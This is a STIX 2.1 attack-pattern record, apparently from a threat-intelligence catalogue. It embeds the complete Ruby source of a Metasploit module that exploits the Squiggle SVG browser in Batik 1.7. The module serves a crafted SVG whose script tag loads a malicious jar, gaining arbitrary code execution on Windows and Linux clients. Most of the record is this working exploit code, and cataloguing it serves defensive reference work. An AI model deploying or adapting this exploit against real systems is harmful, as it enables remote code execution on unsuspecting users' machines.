{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e70f6e4-e3b6-4491-8bda-1d0222a262ce",
    "created": "2024-08-14T17:06:33.358838Z",
    "modified": "2024-08-14T17:06:33.358842Z",
    "name": "\"Squiggle 1.7 SVG Browser Java Code Execution\"",
    "description": " This module abuses the SVG support to execute Java Code in the Squiggle Browser included in the Batik framework 1.7 through a crafted SVG file referencing a jar file.  In order to gain arbitrary code execution, the browser must meet the following conditions: (1) It must support at least SVG version 1.1 or newer, (2) It must support Java code and (3) The \"Enforce secure scripting\" check must be disabled.  The module has been tested against Windows and Linux platforms.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/batik_svg_java.rb",
            "external_id": "batik_svg_java.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.agarri.fr/blog/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Squiggle 1.7 SVG Browser Java Code Execution\",\n      'Description'    => %q{\n          This module abuses the SVG support to execute Java Code in the\n        Squiggle Browser included in the Batik framework 1.7 through a\n        crafted SVG file referencing a jar file.\n\n        In order to gain arbitrary code execution, the browser must meet\n        the following conditions: (1) It must support at least SVG version\n        1.1 or newer, (2) It must support Java code and (3) The \"Enforce\n        secure scripting\" check must be disabled.\n\n        The module has been tested against Windows and Linux platforms.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nicolas Gregoire', # aka @Agarri_FR, Abuse discovery and PoC\n          'sinn3r',           # Metasploit module\n          'juan vazquez'      # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '81965'],\n          ['URL', 'http://www.agarri.fr/blog/']\n        ],\n      'Payload'       =>\n        {\n          'Space' => 20480,\n          'BadChars' => '',\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => %w{ java linux win },\n      'Targets'        =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-11',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    jar_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n    jar_uri << \"/#{rand_text_alpha(rand(6)+3)}.jar\"\n    rand_text = Rex::Text.rand_text_alphanumeric(rand(8)+4)\n\n    if request.uri =~ /\\.jar$/\n      paths = [\n        [ \"Exploit.class\" ],\n        [ \"Exploit$1.class\"],\n        [ \"META-INF\", \"MANIFEST.MF\"]\n      ]\n\n      p = regenerate_payload(cli)\n\n      jar  = p.encoded_jar\n      paths.each do |path|\n        1.upto(path.length - 1) do |idx|\n          full = path[0,idx].join(\"/\") + \"/\"\n          if !(jar.entries.map{|e|e.name}.include?(full))\n            jar.add_file(full, '')\n          end\n        end\n\n        fd = File.open(File.join( Msf::Config.data_directory, \"exploits\", \"batik_svg\", path ), \"rb\")\n        data = fd.read(fd.stat.size)\n        jar.add_file(path.join(\"/\"), data)\n        fd.close\n      end\n\n      print_status(\"#{cli.peerhost} - Sending jar payload\")\n      send_response(cli, jar.pack, {'Content-Type'=>'application/java-archive'})\n\n    elsif agent =~ /Batik/\n      svg = %Q|\n      <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\">\n      <script type=\"application/java-archive\" xlink:href=\"#{jar_uri}\"/>\n      <text>#{rand_text}</text>\n      </svg>\n      |\n\n      svg = svg.gsub(/\\t\\t\\t/, '')\n      print_status(\"#{cli.peerhost} - Sending SVG\")\n      send_response(cli, svg, {'Content-Type'=>'image/svg+xml'})\n\n    else\n      print_error(\"#{cli.peerhost} - Unknown client request: #{request.uri.inspect}\")\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-05-11",
    "x_mitre_platforms": [
        "linux"
    ]
}